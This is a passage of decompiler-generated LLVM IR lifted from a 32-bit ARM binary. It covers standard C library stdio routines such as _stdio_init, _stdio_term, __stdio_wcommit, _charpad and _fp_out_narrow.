  %v1_1372c = load i32, i32* @r6, align 4
  %v2_1372c = inttoptr i32 %v1_1372c to i32*
  store i32 %v0_1372c, i32* %v2_1372c, align 4
  %v0_13730 = load i32, i32* @r8, align 4
  %v1_13730 = add i32 %v0_13730, 8
  %v2_13730 = inttoptr i32 %v1_13730 to i32*
  %v3_13730 = load i32, i32* %v2_13730, align 4
  store i32 %v3_13730, i32* %r3.global-to-local, align 4
  %v2_13734 = icmp eq i32 %v3_13730, 0
  store i1 %v2_13734, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13734, label %dec_label_pc_1373c, label %bb37

dec_label_pc_1373c:                               ; preds = %bb36
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_13740 = call i32 @malloc(i32 4096)
  store i32 %v1_13740, i32* %r0.global-to-local, align 4
  %v2_13744 = icmp eq i32 %v1_13740, 0
  store i1 %v2_13744, i1* %cpsr_z.global-to-local, align 1
  %v1_13758.pre = load i32, i32* @r8, align 4
  br i1 %v2_13744, label %.thread7.thread, label %.thread8

.thread7.thread:                                  ; preds = %dec_label_pc_1373c
  %v2_1375820 = add i32 %v1_13758.pre, 8
  %v3_1375821 = inttoptr i32 %v2_1375820 to i32*
  store i32 0, i32* %v3_1375821, align 4
  br label %.thread10

.thread8:                                         ; preds = %dec_label_pc_1373c
  %v2_13748 = inttoptr i32 %v1_13758.pre to i32*
  %v3_13748 = load i32, i32* %v2_13748, align 4
  %v2_1374c = or i32 %v3_13748, 16384
  store i32 %v2_1374c, i32* %r3.global-to-local, align 4
  %v2_13750 = add i32 %v1_13740, 4096
  store i32 %v2_13750, i32* %r2.global-to-local, align 4
  %v4_13754 = sdiv i32 %v2_1374c, 256
  store i32 %v4_13754, i32* %r1.global-to-local, align 4
  %v2_13758 = add i32 %v1_13758.pre, 8
  %v3_13758 = inttoptr i32 %v2_13758 to i32*
  store i32 %v1_13740, i32* %v3_13758, align 4
  %v1_1375c = load i32, i32* %r2.global-to-local, align 4
  %v2_1375c = load i32, i32* @r8, align 4
  %v3_1375c = add i32 %v2_1375c, 12
  %v4_1375c = inttoptr i32 %v3_1375c to i32*
  store i32 %v1_1375c, i32* %v4_1375c, align 4
  %v1_13760 = load i32, i32* %r1.global-to-local, align 4
  %v2_13760 = trunc i32 %v1_13760 to i8
  %v3_13760 = load i32, i32* @r8, align 4
  %v4_13760 = add i32 %v3_13760, 1
  %v5_13760 = inttoptr i32 %v4_13760 to i8*
  store i8 %v2_13760, i8* %v5_13760, align 1
  %v0_13764.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13764.pr.pr, label %.thread10, label %.thread9

.thread9:                                         ; preds = %.thread8
  %v1_13764 = load i32, i32* %r3.global-to-local, align 4
  %v2_13764 = trunc i32 %v1_13764 to i8
  %v3_13764 = load i32, i32* @r8, align 4
  %v4_13764 = inttoptr i32 %v3_13764 to i8*
  store i8 %v2_13764, i8* %v4_13764, align 1
  %v0_13768.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13768.pr.pr, label %.thread10, label %bb37

.thread10:                                        ; preds = %.thread7.thread, %.thread8, %.thread9
  %v2_13768 = load i32, i32* @r8, align 4
  %v3_13768 = add i32 %v2_13768, 12
  %v4_13768 = inttoptr i32 %v3_13768 to i32*
  store i32 %v1_13740, i32* %v4_13768, align 4
  br label %bb37

bb37:                                             ; preds = %bb36, %.thread9, %.thread10
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2653c.864 to i32), i32* %r3.global-to-local, align 4
  %v2_13774 = load i32, i32* @r8, align 4
  %v3_13774 = add i32 %v2_13774, 2
  %v4_13774 = inttoptr i32 %v3_13774 to i8*
  store i8 0, i8* %v4_13774, align 1
  %v0_13778 = load i32, i32* @r8, align 4
  %v1_13778 = add i32 %v0_13778, 1
  %v2_13778 = inttoptr i32 %v1_13778 to i8*
  %v3_13778 = load i8, i8* %v2_13778, align 1
  %v4_13778 = zext i8 %v3_13778 to i32
  store i32 %v4_13778, i32* %r2.global-to-local, align 4
  %v2_1377c = load i32, i32* @global_var_2653c.864, align 4
  store i32 %v2_1377c, i32* %r1.global-to-local, align 4
  %v1_13780 = add i32 %v0_13778, 8
  %v2_13780 = inttoptr i32 %v1_13780 to i32*
  %v3_13780 = load i32, i32* %v2_13780, align 4
  store i32 %v3_13780, i32* %r3.global-to-local, align 4
  %v1_13784 = and i32 %v4_13778, 32
  %v2_13784 = icmp eq i32 %v1_13784, 0
  store i1 %v2_13784, i1* %cpsr_z.global-to-local, align 1
  %v2_13788 = add i32 %v0_13778, 20
  %v3_13788 = inttoptr i32 %v2_13788 to i32*
  store i32 %v3_13780, i32* %v3_13788, align 4
  %v0_1378c = load i32, i32* %r0.global-to-local, align 4
  %v1_1378c = load i32, i32* @r8, align 4
  %v2_1378c = add i32 %v1_1378c, 44
  %v3_1378c = inttoptr i32 %v2_1378c to i32*
  store i32 %v0_1378c, i32* %v3_1378c, align 4
  %v0_13790 = load i32, i32* %r1.global-to-local, align 4
  %v1_13790 = load i32, i32* @r8, align 4
  %v2_13790 = add i32 %v1_13790, 52
  %v3_13790 = inttoptr i32 %v2_13790 to i32*
  store i32 %v0_13790, i32* %v3_13790, align 4
  %v0_13794 = load i32, i32* %r3.global-to-local, align 4
  %v1_13794 = load i32, i32* @r8, align 4
  %v2_13794 = add i32 %v1_13794, 24
  %v3_13794 = inttoptr i32 %v2_13794 to i32*
  store i32 %v0_13794, i32* %v3_13794, align 4
  %v0_13798 = load i32, i32* %r3.global-to-local, align 4
  %v1_13798 = load i32, i32* @r8, align 4
  %v2_13798 = add i32 %v1_13798, 28
  %v3_13798 = inttoptr i32 %v2_13798 to i32*
  store i32 %v0_13798, i32* %v3_13798, align 4
  %v0_1379c = load i32, i32* %r3.global-to-local, align 4
  %v1_1379c = load i32, i32* @r8, align 4
  %v2_1379c = add i32 %v1_1379c, 16
  %v3_1379c = inttoptr i32 %v2_1379c to i32*
  store i32 %v0_1379c, i32* %v3_1379c, align 4
  br i1 %v2_13784, label %dec_label_pc_13830, label %dec_label_pc_137a4

dec_label_pc_137a4:                               ; preds = %bb37
  %v2_137a4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_137a4, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_17034.847 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26524.851 to i32), i32* %r2.global-to-local, align 4
  %v1_137bc = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_26524.851 to i32), i32* %r0.global-to-local, align 4
  %v1_137cc = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_2650c.870 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_13580, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_17034.847 to i32), i32* %r1.global-to-local, align 4
  %v1_137e0 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_2650c.870 to i32), i32* %r0.global-to-local, align 4
  %v1_137ec = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_26508.873 to i32), i32* %r2.global-to-local, align 4
  %v2_137f4 = load i32, i32* bitcast (i32** @global_var_26508.873 to i32*), align 4
  store i32 %v2_137f4, i32* %r3.global-to-local, align 4
  store i32 %v2_13580, i32* @r0, align 4
  %v1_137fc = load i32, i32* @r8, align 4
  %v2_137fc = add i32 %v1_137fc, 32
  %v3_137fc = inttoptr i32 %v2_137fc to i32*
  store i32 %v2_137f4, i32* %v3_137fc, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_13808 = load i32, i32* @r8, align 4
  %v1_13808 = load i32, i32* %r2.global-to-local, align 4
  %v2_13808 = inttoptr i32 %v1_13808 to i32*
  store i32 %v0_13808, i32* %v2_13808, align 4
  %v1_13810 = call i32 @__pthread_return_void()
  store i32 %v2_137a4, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 79912, i32* @lr, align 4
  %v1_13824 = call i32 @__pthread_return_void()
  store i32 %v1_13824, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13830

dec_label_pc_1382c:                               ; preds = %dec_label_pc_135c0, %dec_label_pc_135ac, %dec_label_pc_135cc
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_13830

dec_label_pc_13830:                               ; preds = %bb37, %dec_label_pc_13604, %dec_label_pc_137a4, %dec_label_pc_1382c
  %v0_13830 = load i32, i32* @r8, align 4
  store i32 %v0_13830, i32* %r0.global-to-local, align 4
  %v2_13838 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13838, i32* @r4, align 4
  store i32 %v6_13574, i32* @r5, align 4
  store i32 %v9_13574, i32* @r6, align 4
  store i32 %v15_13574, i32* @r8, align 4
  ret i32 %v0_13830

; uselistorder directives
  uselistorder i32 %v1_13758.pre, { 1, 0, 2 }
  uselistorder i32 %v1_13740, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_13720, { 1, 0 }
  uselistorder i32 %v3_136b41, { 1, 0 }
  uselistorder i32 %v0_13694, { 1, 0 }
  uselistorder i1 %v7_13688, { 1, 0 }
  uselistorder i32 %v1_13658, { 1, 0 }
  uselistorder i32 %v0_13658, { 1, 0 }
  uselistorder i32 %v1_13640, { 1, 0, 2 }
  uselistorder i32 %v1_135f4, { 1, 0 }
  uselistorder i1 %v7_135a0, { 1, 0 }
  uselistorder i1 %v7_13594, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 10, 9, 12, 11, 14, 13, 15, 17, 16, 18, 19 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 16384, { 18, 4, 11, 5, 12, 6, 13, 2, 14, 3, 15, 0, 16, 1, 17, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_13830, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1382c, { 2, 0, 1 }
  uselistorder label %bb37, { 2, 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %bb36, { 1, 0 }
  uselistorder label %dec_label_pc_13688._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_13630, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_135dc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_135ac, { 1, 2, 0 }
}

define i32 @"$d.2"(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1383c:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_1383c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1383c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1383c
  %v3_13844 = and i32 %arg4, %arg3
  store i32 %v3_13844, i32* %r0.global-to-local, align 4
  %v2_13848 = trunc i32 %v3_13844 to i16
  %v4_13848 = inttoptr i32 %v3_13844 to i16*
  store i16 %v2_13848, i16* %v4_13848, align 2
  %v5_13848 = load i32, i32* @r6, align 4
  %v6_13848 = load i32, i32* %r0.global-to-local, align 4
  %v7_13848 = sub i32 %v6_13848, %v5_13848
  store i32 %v7_13848, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1383c, %bb
  %v8_13848 = phi i32 [ %tmp, %dec_label_pc_1383c ], [ %v7_13848, %bb ]
  ret i32 %v8_13848

; uselistorder directives
  uselistorder i32 %v3_13844, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1386c = load i32, i32* @r4, align 4
  store i32 %v3_1386c, i32* %stack_var_-24, align 4
  %v9_1386c = load i32, i32* @r6, align 4
  %v0_13870 = call i32 @__errno_location()
  store i32 ptrtoint (i8** @global_var_26540.840 to i32), i32* @r4, align 4
  %v3_13878 = load i8, i8* @global_var_26541.876, align 1
  %v4_13878 = zext i8 %v3_13878 to i32
  %v2_1387c = load i8, i8* bitcast (i8** @global_var_26540.840 to i8*), align 4
  %v3_1387c = zext i8 %v2_1387c to i32
  store i32 %v0_13870, i32* @r7, align 4
  store i32 0, i32* @r0, align 4
  %v4_13888 = mul nuw nsw i32 %v4_13878, 256
  %v5_13888 = or i32 %v3_1387c, %v4_13888
  store i32 %v5_13888, i32* @r6, align 4
  %v1_1388c = inttoptr i32 %v0_13870 to i32*
  %v2_1388c = load i32, i32* %v1_1388c, align 4
  store i32 %v2_1388c, i32* %r8.global-to-local, align 4
  %v1_13890 = call i32 @isatty(i32 0)
  %v1_13894 = sub i32 1, %v1_13890
  %v0_13898 = load i32, i32* @r6, align 4
  %v4_13898 = mul i32 %v1_13894, 256
  %v5_13898 = xor i32 %v4_13898, %v0_13898
  %v3_1389c = load i8, i8* @global_var_26591.877, align 1
  %v4_1389c = zext i8 %v3_1389c to i32
  %v3_138a0 = load i8, i8* @global_var_26590.841, align 1
  %v4_138a0 = zext i8 %v3_138a0 to i32
  %v3_138a4 = sdiv i32 %v5_13898, 256
  store i32 1, i32* @r0, align 4
  %v4_138ac = mul nuw nsw i32 %v4_1389c, 256
  %v5_138ac = or i32 %v4_138a0, %v4_138ac
  store i32 %v5_138ac, i32* @r5, align 4
  %v1_138b0 = trunc i32 %v3_138a4 to i8
  store i8 %v1_138b0, i8* @global_var_26541.876, align 1
  %v1_138b4 = trunc i32 %v0_13898 to i8
  %v2_138b4 = load i32, i32* @r4, align 4
  %v3_138b4 = inttoptr i32 %v2_138b4 to i8*
  store i8 %v1_138b4, i8* %v3_138b4, align 1
  %v1_138b8 = call i32 @isatty(i32 1)
  %v1_138bc = sub i32 1, %v1_138b8
  %v0_138c0 = load i32, i32* @r5, align 4
  %v4_138c0 = mul i32 %v1_138bc, 256
  %v5_138c0 = xor i32 %v4_138c0, %v0_138c0
  store i32 %v5_138c0, i32* %r5.global-to-local, align 4
  %v3_138c4 = sdiv i32 %v5_138c0, 256
  %v1_138c8 = trunc i32 %v3_138c4 to i8
  store i8 %v1_138c8, i8* @global_var_26591.877, align 1
  %v0_138cc = load i32, i32* %r8.global-to-local, align 4
  %v1_138cc = load i32, i32* @r7, align 4
  %v2_138cc = inttoptr i32 %v1_138cc to i32*
  store i32 %v0_138cc, i32* %v2_138cc, align 4
  %v0_138d0 = load i32, i32* %r5.global-to-local, align 4
  %v1_138d0 = trunc i32 %v0_138d0 to i8
  store i8 %v1_138d0, i8* @global_var_26590.841, align 1
  %v2_138d4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_138d4, i32* @r4, align 4
  store i32 %v9_1386c, i32* @r6, align 4
  ret i32 %v1_138bc

; uselistorder directives
  uselistorder i32 %v1_138bc, { 1, 0 }
  uselistorder i32 %v0_13898, { 1, 0 }
  uselistorder i8* @global_var_26590.841, { 1, 0 }
  uselistorder i8* @global_var_26591.877, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
  uselistorder i8* @global_var_26541.876, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1d234.879 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_138e4 = call i32 @memcpy()
  %v0_138e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_138e8, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_138e4

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_138ec = load i32, i32* @r4, align 4
  store i32 %v3_138ec, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_2650c.870 to i32), i32* @r0, align 4
  %v0_138f4 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_26524.851 to i32), i32* @r0, align 4
  %v0_138fc = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32** @global_var_26508.873 to i32), i32* %r3.global-to-local, align 4
  %storemerge5 = load i32, i32* bitcast (i32** @global_var_26508.873 to i32*), align 4
  store i32 %storemerge5, i32* @r4, align 4
  %v1_139586 = add i32 %storemerge5, 56
  store i32 %v1_139586, i32* @r5, align 4
  %v2_1395c8 = icmp eq i32 %storemerge5, 0
  store i32 %v1_139586, i32* %r0.global-to-local, align 4
  br i1 %v2_1395c8, label %dec_label_pc_13968, label %dec_label_pc_1390c

dec_label_pc_1390c:                               ; preds = %entry, %dec_label_pc_13948
  store i32 ptrtoint (i8* @global_var_17034.847 to i32), i32* %r3.global-to-local, align 4
  store i32 80152, i32* @lr, align 4
  %v1_13914 = call i32 @__pthread_return_0()
  %v2_13918 = icmp eq i32 %v1_13914, 0
  %v0_1391c = load i32, i32* @r5, align 4
  store i32 %v0_1391c, i32* @r0, align 4
  br i1 %v2_13918, label %dec_label_pc_13948, label %dec_label_pc_13924

dec_label_pc_13924:                               ; preds = %dec_label_pc_1390c
  %v0_13924 = load i32, i32* @r4, align 4
  %v1_13924 = add i32 %v0_13924, 8
  %v2_13924 = inttoptr i32 %v1_13924 to i32*
  %v3_13924 = load i32, i32* %v2_13924, align 4
  store i32 %v3_13924, i32* %r3.global-to-local, align 4
  %v3_1392c = inttoptr i32 %v0_13924 to i8*
  store i8 48, i8* %v3_1392c, align 1
  %v2_13934 = load i32, i32* @r4, align 4
  %v3_13934 = add i32 %v2_13934, 1
  %v4_13934 = inttoptr i32 %v3_13934 to i8*
  store i8 0, i8* %v4_13934, align 1
  %v0_13938 = load i32, i32* %r3.global-to-local, align 4
  %v1_13938 = load i32, i32* @r4, align 4
  %v2_13938 = add i32 %v1_13938, 20
  %v3_13938 = inttoptr i32 %v2_13938 to i32*
  store i32 %v0_13938, i32* %v3_13938, align 4
  %v0_1393c = load i32, i32* %r3.global-to-local, align 4
  %v1_1393c = load i32, i32* @r4, align 4
  %v2_1393c = add i32 %v1_1393c, 24
  %v3_1393c = inttoptr i32 %v2_1393c to i32*
  store i32 %v0_1393c, i32* %v3_1393c, align 4
  %v0_13940 = load i32, i32* %r3.global-to-local, align 4
  %v1_13940 = load i32, i32* @r4, align 4
  %v2_13940 = add i32 %v1_13940, 28
  %v3_13940 = inttoptr i32 %v2_13940 to i32*
  store i32 %v0_13940, i32* %v3_13940, align 4
  %v0_13944 = load i32, i32* %r3.global-to-local, align 4
  %v1_13944 = load i32, i32* @r4, align 4
  %v2_13944 = add i32 %v1_13944, 16
  %v3_13944 = inttoptr i32 %v2_13944 to i32*
  store i32 %v0_13944, i32* %v3_13944, align 4
  br label %dec_label_pc_13948

dec_label_pc_13948:                               ; preds = %dec_label_pc_1390c, %dec_label_pc_13924
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_1394c = load i32, i32* @r4, align 4
  %v2_1394c = add i32 %v1_1394c, 52
  %v3_1394c = inttoptr i32 %v2_1394c to i32*
  store i32 1, i32* %v3_1394c, align 4
  %v0_13950 = call i32 @__stdio_init_mutex()
  store i32 %v0_13950, i32* %r0.global-to-local, align 4
  %v0_13954 = load i32, i32* @r4, align 4
  %v1_13954 = add i32 %v0_13954, 32
  %v2_13954 = inttoptr i32 %v1_13954 to i32*
  %storemerge = load i32, i32* %v2_13954, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v1_13958 = add i32 %storemerge, 56
  store i32 %v1_13958, i32* @r5, align 4
  %v2_1395c = icmp eq i32 %storemerge, 0
  store i32 %v1_13958, i32* %r0.global-to-local, align 4
  br i1 %v2_1395c, label %dec_label_pc_13958.dec_label_pc_13968_crit_edge, label %dec_label_pc_1390c

dec_label_pc_13958.dec_label_pc_13968_crit_edge:  ; preds = %dec_label_pc_13948
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_26508.873 to i32*), align 4
  br label %dec_label_pc_13968

dec_label_pc_13968:                               ; preds = %dec_label_pc_13958.dec_label_pc_13968_crit_edge, %entry
  %v11_1399013 = phi i32 [ %v1_13958, %dec_label_pc_13958.dec_label_pc_13968_crit_edge ], [ %v1_139586, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_13958.dec_label_pc_13968_crit_edge ], [ 0, %entry ]
  store i32 ptrtoint (i32** @global_var_26508.873 to i32), i32* %r3.global-to-local, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  %v2_139884 = icmp eq i32 %storemerge12, 0
  br i1 %v2_139884, label %dec_label_pc_13990, label %dec_label_pc_13974

dec_label_pc_13974:                               ; preds = %dec_label_pc_13968, %dec_label_pc_13974
  %v0_1397c = phi i32 [ %storemerge1, %dec_label_pc_13974 ], [ %storemerge12, %dec_label_pc_13968 ]
  %v1_13974 = inttoptr i32 %v0_1397c to i8*
  %v2_13974 = load i8, i8* %v1_13974, align 1
  %v3_13974 = zext i8 %v2_13974 to i32
  store i32 %v3_13974, i32* %r3.global-to-local, align 4
  %v1_13978 = and i32 %v3_13974, 64
  store i32 %v0_1397c, i32* %r0.global-to-local, align 4
  store i32 80260, i32* @lr, align 4
  %v1_13980 = icmp ne i32 %v1_13978, 0
  call void @__pseudo_cond_branch(i1 %v1_13980, i32 ptrtoint (i32* @global_var_139a4.884 to i32))
  %v0_13984 = load i32, i32* %r4.global-to-local, align 4
  %v1_13984 = add i32 %v0_13984, 32
  %v2_13984 = inttoptr i32 %v1_13984 to i32*
  %storemerge1 = load i32, i32* %v2_13984, align 4
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_13988 = icmp eq i32 %storemerge1, 0
  br i1 %v2_13988, label %dec_label_pc_13988.dec_label_pc_13990_crit_edge, label %dec_label_pc_13974

dec_label_pc_13988.dec_label_pc_13990_crit_edge:  ; preds = %dec_label_pc_13974
  %v11_13990.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13990

dec_label_pc_13990:                               ; preds = %dec_label_pc_13988.dec_label_pc_13990_crit_edge, %dec_label_pc_13968
  %v11_13990 = phi i32 [ %v11_13990.pre, %dec_label_pc_13988.dec_label_pc_13990_crit_edge ], [ %v11_1399013, %dec_label_pc_13968 ]
  %v2_13990 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13990, i32* @r4, align 4
  ret i32 %v11_13990

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32 ()* @__stdio_init_mutex, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_13974, { 1, 0 }
  uselistorder label %dec_label_pc_13948, { 1, 0 }
  uselistorder label %dec_label_pc_1390c, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_139a4 = load i32, i32* @r4, align 4
  store i32 %v3_139a4, i32* %stack_var_-8, align 4
  %v0_139a8 = load i32, i32* @r0, align 4
  %v1_139a8 = add i32 %v0_139a8, 8
  %v2_139a8 = inttoptr i32 %v1_139a8 to i32*
  %v3_139a8 = load i32, i32* %v2_139a8, align 4
  %v1_139ac = add i32 %v0_139a8, 16
  %v2_139ac = inttoptr i32 %v1_139ac to i32*
  %v3_139ac = load i32, i32* %v2_139ac, align 4
  %v9_139b0 = icmp eq i32 %v3_139ac, %v3_139a8
  store i32 %v0_139a8, i32* %r4.global-to-local, align 4
  br i1 %v9_139b0, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_139a8, i32* %v2_139ac, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  store i32 80324, i32* @lr, align 4
  %v1_139c0 = xor i1 %v9_139b0, true
  call void @__pseudo_cond_branch(i1 %v1_139c0, i32 ptrtoint (i32* @global_var_17718.885 to i32))
  %v0_139c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_139c4 = add i32 %v0_139c4, 8
  %v2_139c4 = inttoptr i32 %v1_139c4 to i32*
  %v3_139c4 = load i32, i32* %v2_139c4, align 4
  %v1_139c8 = add i32 %v0_139c4, 16
  %v2_139c8 = inttoptr i32 %v1_139c8 to i32*
  %v3_139c8 = load i32, i32* %v2_139c8, align 4
  %v2_139cc = sub i32 %v3_139c8, %v3_139c4
  %v2_139d0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_139d0, i32* @r4, align 4
  ret i32 %v2_139cc

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v3_139d4 = load i32, i32* @r4, align 4
  %v6_139d4 = load i32, i32* @r5, align 4
  %v9_139d4 = load i32, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r4, align 4
  store i8 %arg2, i8* %stack_var_-17, align 1
  %v2_139f42 = icmp eq i32 %arg3, 0
  %v2_139f8 = ptrtoint i8* %stack_var_-17 to i32
  br i1 %v2_139f42, label %dec_label_pc_13a14, label %dec_label_pc_13a08

dec_label_pc_139f0:                               ; preds = %dec_label_pc_13a08
  %v1_139f0 = add i32 %v0_139f0, -1
  store i32 %v1_139f0, i32* @r4, align 4
  %v2_139f4 = icmp eq i32 %v1_139f0, 0
  %v0_13a00 = load i32, i32* @r6, align 4
  br i1 %v2_139f4, label %dec_label_pc_13a14.loopexit, label %dec_label_pc_13a08

dec_label_pc_13a08:                               ; preds = %entry, %dec_label_pc_139f0
  %v0_13a004 = phi i32 [ %v0_13a00, %dec_label_pc_139f0 ], [ %arg1, %entry ]
  %v3_13a08 = call i32 @__stdio_fwrite(i32 %v2_139f8, i32 1, i32 %v0_13a004)
  %v7_13a0c = icmp eq i32 %v3_13a08, 1
  %v0_139f0 = load i32, i32* @r4, align 4
  br i1 %v7_13a0c, label %dec_label_pc_139f0, label %dec_label_pc_13a14.loopexit

dec_label_pc_13a14.loopexit:                      ; preds = %dec_label_pc_139f0, %dec_label_pc_13a08
  %v0_13a14.ph = phi i32 [ %v0_139f0, %dec_label_pc_13a08 ], [ 0, %dec_label_pc_139f0 ]
  %v1_13a14.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13a14

dec_label_pc_13a14:                               ; preds = %dec_label_pc_13a14.loopexit, %entry
  %v1_13a14 = phi i32 [ 0, %entry ], [ %v1_13a14.pre, %dec_label_pc_13a14.loopexit ]
  %v0_13a14 = phi i32 [ 0, %entry ], [ %v0_13a14.ph, %dec_label_pc_13a14.loopexit ]
  %v2_13a14 = sub i32 %v1_13a14, %v0_13a14
  store i32 %v3_139d4, i32* @r4, align 4
  store i32 %v6_139d4, i32* @r5, align 4
  store i32 %v9_139d4, i32* @r6, align 4
  ret i32 %v2_13a14

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13a14.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_13a08, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13a20 = load i32, i32* @r4, align 4
  store i32 %v3_13a20, i32* %stack_var_-24, align 4
  %v9_13a20 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_13a28 = and i32 %arg2, 128
  %v2_13a28 = icmp eq i32 %v1_13a28, 0
  %v0_13a2c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13a2c, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_13a28, label %bb, label %dec_label_pc_13a40

bb:                                               ; preds = %entry
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13a80

dec_label_pc_13a40:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_13a44 = call i32 @strlen(i8* %arg4)
  store i32 %v3_13a44, i32* %r0.global-to-local, align 4
  %v1_13a48 = load i32, i32* %r4.global-to-local, align 4
  %v2_13a48 = sub i32 %v1_13a48, %v3_13a44
  store i32 %v2_13a48, i32* @r4, align 4
  store i32 %v3_13a44, i32* @r5, align 4
  %tmp16 = icmp slt i32 %v2_13a48, 1
  br i1 %tmp16, label %.thread, label %dec_label_pc_13a60

.thread:                                          ; preds = %dec_label_pc_13a40
  store i32 %v3_13a44, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13a80

dec_label_pc_13a60:                               ; preds = %dec_label_pc_13a40
  %v0_13a60 = load i32, i32* @r6, align 4
  %v1_13a60 = urem i32 %v0_13a60, 128
  %v0_13a64 = load i32, i32* @r8, align 4
